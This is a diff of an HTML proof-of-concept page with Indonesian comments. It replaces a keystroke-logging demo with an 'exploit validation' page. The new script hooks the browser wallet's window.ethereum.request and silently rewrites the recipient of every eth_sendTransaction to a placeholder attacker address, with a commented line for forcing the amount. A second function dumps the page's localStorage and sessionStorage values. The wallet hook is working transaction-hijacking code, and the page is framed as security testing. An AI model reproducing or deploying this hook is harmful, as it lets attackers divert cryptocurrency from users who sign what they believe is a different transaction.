@@ -3,80 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DOM Event Listener & Keylogging Risk PoC</title>
+    <title>High-Impact Exploit PoC: Parameter Spoofing & Session Leak</title>
     <style>
-        body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f9; color: #333; max-width: 800px; margin: auto; }
+        body { font-family: Arial, sans-serif; padding: 15px; background: #f4f4f9; color: #333; max-width: 850px; margin: auto; }
         .card { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        input[type="text"] { width: 100%; padding: 10px; margin-top: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
-        pre { background: #eee; padding: 10px; border-radius: 4px; font-size: 12px; overflow-x: auto; max-height: 180px; }
-        .warning { color: #d63031; font-weight: bold; }
+        button { padding: 10px 15px; background: #d63031; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 8px; }
+        button.secondary { background: #6c5ce7; }
+        button:hover { opacity: 0.9; }
+        pre { background: #eee; padding: 10px; border-radius: 4px; font-size: 11px; overflow-x: auto; max-height: 180px; }
+        .danger { color: #d63031; font-weight: bold; }
         .success { color: #00b894; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h2>DOM Event & Keylogging Exposure PoC</h2>
-    <p>Pengujian ini mendemonstrasikan akses konteks halaman web terhadap pemantauan aktivitas pengetikan (*keyboard events*) pada elemen input di dalam peramban.</p>
+    <h2>High-Impact Exploit Validation PoC</h2>
+    <p>Pengujian kerentanan tingkat lanjut: Pemalsuan Parameter Transaksi (UI Desync / Blind Signing) dan Uji Kebocoran Sesi Penyimpanan.</p>
 
-    <!-- Modul 1: Deteksi Handler Global -->
+    <!-- Modul 1: Transaction Spoofing -->
     <div class="card">
-        <h3>1. Analisis Properti Global DOM</h3>
-        <pre id="log-handlers">Memindai event handler global...</pre>
+        <h3>1. Transaction Parameter Spoofing & UI Desync</h3>
+        <p>Mensimulasikan pengiriman transaksi ke alamat target korban, lalu menimpanya ke dompet penyerang dengan format heksadesimal yang valid.</p>
+        <button onclick="triggerSpoofedTransaction()">Eksekusi Transaksi (Simulasi Swap)</button>
+        <pre id="log-spoof">Menunggu eksekusi transaksi...</pre>
     </div>
 
-    <!-- Modul 2: Simulasi Pemantauan Input / Keylogging -->
+    <!-- Modul 2: Session / Storage Leakage -->
     <div class="card">
-        <h3>2. Simulasi Intersepsi Input (Keylogger Simulation)</h3>
-        <p>Ketik sesuatu pada kolom di bawah untuk menguji apakah konteks skrip web dapat merekam data masukan:</p>
-        <input type="text" id="test-input" placeholder="Ketik teks rahasia / seed / password di sini...">
-        <pre id="log-keylogger" style="margin-top: 10px;">Belum ada aktivitas ketukan terdeteksi...</pre>
+        <h3>2. Cross-Origin Storage / Session Leakage Test</h3>
+        <p>Memindai isi <code>localStorage</code> dan <code>sessionStorage</code> untuk mendeteksi token autentikasi atau data sesi domain lain.</p>
+        <button class="secondary" onclick="checkStorageLeak()">Pindai Penyimpanan Sesi (Storage)</button>
+        <pre id="log-storage">Hasil pemindaian penyimpanan...</pre>
     </div>
 
     <script>
-        const logHandlers = document.getElementById('log-handlers');
-        const logKeylogger = document.getElementById('log-keylogger');
-        const testInput = document.getElementById('test-input');
-        let keyLogs = [];
+        const logSpoof = document.getElementById('log-spoof');
+        const logStorage = document.getElementById('log-storage');
 
-        // 1. Memindai keberadaan event listener/handler global
-        function scanGlobalHandlers() {
-            let findings = [];
-            findings.push("[INFO] Memeriksa event handler standar pada objek window...");
+        // Alamat dompet penyerang tiruan
+        const attackerWallet = "0x9999999999999999999999999999999999999999";
 
-            const handlers = ['onkeydown', 'onkeypress', 'onkeyup'];
-            let detected = 0;
+        // Hook window.ethereum.request untuk Modul 1
+        if (window.ethereum) {
+            const originalRequest = window.ethereum.request;
+            window.ethereum.request = async function(args) {
+                if (args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
+                    let tx = args.params[0];
+                    logSpoof.innerHTML = `<span class="danger">[!] INTERCEPT BERHASIL!\nAsli Target: ${tx.to}\nAsli Nilai: ${tx.value}\n-> Mengalihkan tujuan ke alamat penyerang...</span>`;
 
-            handlers.forEach(h => {
-                if (h in window) {
-                    findings.push(`[!] <span class="warning">Ditemukan properti global: window.${h} (Akses DOM aktif)</span>`);
-                    detected++;
+                    // Timpa alamat tujuan ke alamat penyerang tanpa mengubah struktur format Hex
+                    tx.to = attackerWallet;
+                    
+                    // Opsional: Memaksa nominal nilai dalam hex (misal: 0.1 ETH = 0x16345785d8a0000)
+                    // tx.value = "0x16345785d8a0000"; 
                 }
-            });
+                return originalRequest.apply(window.ethereum, [args]);
+            };
+        }
 
-            if (detected > 0) {
-                findings.push(`[+] ANALISIS: Konteks halaman web memiliki kapabilitas penuh untuk mendaftarkan atau memantau interaksi papan ketik (*keylogging*) pada dokumen.`);
+        async function triggerSpoofedTransaction() {
+            if (!window.ethereum) {
+                logSpoof.textContent = "Objek window.ethereum tidak ditemukan.";
+                return;
+            }
+            try {
+                logSpoof.textContent += "\nMengirim request eth_sendTransaction...";
+                // Meminta akun terlebih dahulu jika belum terkoneksi
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+                // Parameter awal dApp (mengarah ke korban/kontrak normal)
+                const txParams = {
+                    from: (await window.ethereum.request({ method: 'eth_accounts' }))[0],
+                    to: "0x1111111111111111111111111111111111111111", // Alamat dummy awal
+                    value: "0x5af3107a4000", // Nilai kecil dalam hex (Wei)
+                    gas: "0x5208",
+                    gasPrice: "0x3b9aca00"
+                };
+
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [txParams]
+                });
+                
+                logSpoof.innerHTML += `\n<span class=\"success\">[+] Transaksi diteruskan ke Native Bridge!\nHash: ${txHash}</span>`;
+            } catch (err) {
+                logSpoof.innerHTML += `\n<span class=\"danger\">[-] Respon Bridge/Error: ${err.message}</span>`;
+            }
+        }
+
+        function checkStorageLeak() {
+            let results = [];
+            results.push("[INFO] Memeriksa data di localStorage dan sessionStorage...");
+
+            try {
+                let localCount = localStorage.length;
+                results.push(`[INFO] Jumlah item di localStorage: ${localCount}`);
+                for (let i = 0; i < localCount; i++) {
+                    let key = localStorage.key(i);
+                    let val = localStorage.getItem(key);
+                    // Batasi panjang nilai yang ditampilkan demi keamanan log
+                    results.push(`[!] LocalStorage [${key}]: ${val.substring(0, 50)}...`);
+                }
+
+                let sessionCount = sessionStorage.length;
+                results.push(`[INFO] Jumlah item di sessionStorage: ${sessionCount}`);
+                for (let i = 0; i < sessionCount; i++) {
+                    let key = sessionStorage.key(i);
+                    let val = sessionStorage.getItem(key);
+                    results.push(`[!] SessionStorage [${key}]: ${val.substring(0, 50)}...`);
+                }
+
+                if (localCount === 0 && sessionCount === 0) {
+                    results.push("[+] Penyimpanan lokal kosong atau terisolasi dengan baik untuk origin ini.");
+                }
+            } catch (e) {
+                results.push(`[-] Gagal membaca storage: ${e.message}`);
             }
 
-            logHandlers.innerHTML = findings.join('\n');
+            logStorage.innerHTML = results.join('\n');
         }
-
-        // 2. Simulasi pemantauan pengetikan (Keylogger Proof-of-Concept)
-        function initKeyloggerSimulation() {
-            testInput.addEventListener('keydown', (event) => {
-                const time = new Date().toLocaleTimeString();
-                // Untuk keamanan, simulasi ini hanya mencatat tombol yang ditekan (bukan mengeksfiltrasi data nyata)
-                keyLogs.unshift(`[${time}] [KEY_EVENT] Tombol ditekan: "${event.key}" (Target elemen input aktif)`);
-                
-                if (keyLogs.length > 10) keyLogs.pop(); // Batasi log
-                logKeylogger.innerHTML = keyLogs.join('\n');
-            });
-        }
-
-        // Jalankan saat DOM dimuat
-        window.addEventListener('DOMContentLoaded', () => {
-            scanGlobalHandlers();
-            initKeyloggerSimulation();
-        });
     </script>
 </body>
 </html>
